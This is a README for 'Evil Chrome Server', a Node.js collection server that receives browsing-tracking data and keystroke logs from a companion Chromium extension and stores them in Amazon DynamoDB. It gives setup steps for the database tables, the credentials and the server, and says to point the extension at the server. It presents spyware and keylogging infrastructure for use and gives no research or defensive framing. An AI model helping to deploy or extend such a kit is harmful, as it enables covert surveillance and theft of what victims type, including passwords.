# Evil Chrome Server
Server where chrome tracking information & key logging is sent to. Must be severed with https, otherwise it will only work when user browses http sites.

## Installation

`npm install`

## Database
Using Amazon's dynamodb for saving logged information. Setup a table on dynamodb with a key of time, type of number. Then create a role using Amazon's IAM service. Save your credentials into the file called `_credentials.json` then rename it `credentials.json`.

Script expects the following tables to exist on dynamodb:

* **Logger**, with partition key of time, type Number.
* **Map**, with partition key of time, type Number.
* **User**, with partition key of id, type String.

## Usage
`node app.js`

Then edit chromium extension variable called server to point at this.
